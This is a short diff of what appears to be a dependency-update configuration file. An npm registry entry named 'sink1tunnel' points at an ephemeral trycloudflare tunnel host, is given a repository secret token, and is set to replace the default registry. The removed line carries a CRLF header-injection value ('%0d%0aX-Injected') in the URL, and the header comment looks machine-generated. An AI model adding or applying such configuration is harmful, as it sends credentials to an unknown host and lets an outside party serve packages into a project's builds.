@@ -1,9 +1,9 @@
-# p7r p5c_5c_cfg 1790607899
+# p7r p5c_5c_encq 1790608118
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/redirc/ctrl%0d%0aX-Injected:%20probe
+    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/redirc/encq
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
